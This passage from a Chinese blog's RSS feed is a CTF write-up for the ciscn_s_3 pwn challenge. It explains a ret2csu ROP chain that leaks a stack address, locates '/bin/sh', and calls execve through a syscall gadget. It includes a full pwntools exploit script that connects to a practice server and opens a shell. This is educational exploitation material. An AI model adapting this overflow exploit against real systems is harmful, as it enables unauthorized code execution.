&lt;p&gt;原理:&lt;a href=&#34;https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu&#34; title=&#34;64位构造通用ROP&#34;&gt;https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;5构造rop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5构造rop&#34;&gt;#&lt;/a&gt; 5. 构造 rop&lt;/h4&gt;
&lt;p&gt;通过 ida 可以找到 csu 段地址，下面为 gadgets1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcCbss.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;当我们进入 gadgets1 时，执行了 add rsp ,8 所以要填充 8 个字符，后续的 rbx 要为 0 才能不跳转，rbp 为 1 使其与后续加 1 后的 rbx 相同，r12 不需要所以可以任意，r13，r14，r15 分别会在 gadgets2 控制 rdx，rsi，rdi，填入我们需要的值，具体值如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;rbx=0&lt;/li&gt;
&lt;li&gt;rbp=1&lt;/li&gt;
&lt;li&gt;r12=0&lt;/li&gt;
&lt;li&gt;r13=0  （对应 rdx=0）&lt;/li&gt;
&lt;li&gt;r14=0  （对应 rsi=0）&lt;/li&gt;
&lt;li&gt;r15=&amp;quot;binsh&amp;quot; 的地址  （对应 rdi=&amp;quot;/bin/sh&amp;quot;）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此处执行的是  &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,0,0)  &lt;/code&gt;  execve( rdi , rsi , rdx )&lt;/p&gt;
&lt;p&gt;由此我们需要找到 &amp;quot;/bin/sh&amp;quot; 地址，由于程序内找不到 &amp;quot;/bin/sh&amp;quot; , 所以需要我们自己写入 &amp;quot;/bin/sh&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcCjoV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;由上面的图可以看到，sys_wrtie 会输出 0x30 个字符，而 buf 在栈上只有 0x10 的大小，后面紧接着的 0x10 为 ret 和初始的 rbp 所占空间，后面 8 个字符为栈上的某一地址， &lt;strong&gt;利用该地址减去与 &amp;quot;/bin/sh&amp;quot; 地址的偏移量&lt;/strong&gt; 即可获得 &amp;quot;/bin/sh&amp;quot; 地址。（这里是因为开启了保护每次在栈上的地址不同，而偏移是不会变的）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看方式 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcii9S.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;由上面的图片可以看出输入的字符串的地址（这里因为溢出所以应该为 ddf0），而看到距离 rsp 为 0x20 的地方输出了我们调试的程序的名称，这个一般是保存在 avrg [0]，这个是栈上的地址&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看方式 2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcFrGT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;首先为写入的 buf 地址，然后在 0x20 大小后为栈地址，原因入下图，因此通过 sys_write 即可泄露&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcAxxS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;由于开启了保护所以写入栈的位置是不固定的，但是可以通过当此运行时泄露的栈地址减去固定的偏移量即可得到写入的字符串地址&lt;/p&gt;
&lt;h3 id=&#34;7字符串地址计算方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7字符串地址计算方法&#34;&gt;#&lt;/a&gt; 7. 字符串地址计算方法:&lt;/h3&gt;
&lt;p&gt;通过上面的 0x7fffffffdf38-0x7fffffffddf0=0x148 , 在计算栈的偏移时是 0x148（不知道是不是因为计算错误），但是线上靶场的环境栈的偏移是 0x118。&lt;/p&gt;
&lt;p&gt;在本地可以利用 patchelf 切换 libc 版本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ ./ciscn_s_3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;有了偏移之后就可以通过偏移量来计算输入的字符串地址：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;输入字符串地址 = 泄露的栈地址 - 0x118&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;至此就得到了 &amp;quot;/bin/sh&amp;quot; 地址&lt;/p&gt;
&lt;h3 id=&#34;8构造exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8构造exp&#34;&gt;#&lt;/a&gt; 8. 构造 exp&lt;/h3&gt;
&lt;p&gt;因为 &amp;quot;/bin/sh&amp;quot; 占 7 个字节，需要改成 &amp;quot;/bin/sh\x00&amp;quot; 来用隔断符来满足 8 个字节进行对齐&lt;/p&gt;
&lt;p&gt;先执行 syscall 还是先到 gadgets:&lt;/p&gt;
&lt;p&gt;先 gadgets 最后返回到 syscall&lt;/p&gt;
&lt;p&gt;系统调用号与 syscall 之间的执行顺序：&lt;/p&gt;
&lt;p&gt;系统调用号执行后返回到 syscall，参数都在前面&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26711&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./ciscn_s_3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x04004ED&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;execve&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x0004004E2&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#mov rax,3BH; ret;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;syscall&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x000400501&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gadgets1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x000040059a&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gadgets2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x0000400580&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rdi_ret&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x004005a3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;csu&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;/bin/sh\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gadgets1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#此处 r15 的值可有可无，因为后面仍然调用 rdi_ret 来传参&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gadgets2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rdi_ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binsh&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;execve&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;syscall&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;/bin/sh\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 此处之间填充到 ret，没有考虑 rbp，gdb 中调试就可以发现&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;binsh&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x118&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#减去偏移获得 &#34;/bin/sh&#34; 地址&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;binsh&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;binsh&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 这里的 binsh+0x50 是传入字符串 &#34;/bin/sh&#34; 后开始，到 p64（execve）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p.recv()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;借用别人的一张图理解 binsh+0x50&lt;br /&gt;
&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20210423174224878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXlpY2hlbnNzcw==,size_16,color_FFFFFF,t_70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9aTEZ4RA==&#34;&gt;http://t.csdn.cn/ZLFxD&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9TU1k5bw==&#34;&gt;http://t.csdn.cn/SSY9o&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;注意：不知道是不是因为部分地方没写对，用之前的 csu 方法有点问题，总要 binsh+0x50 才可以&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
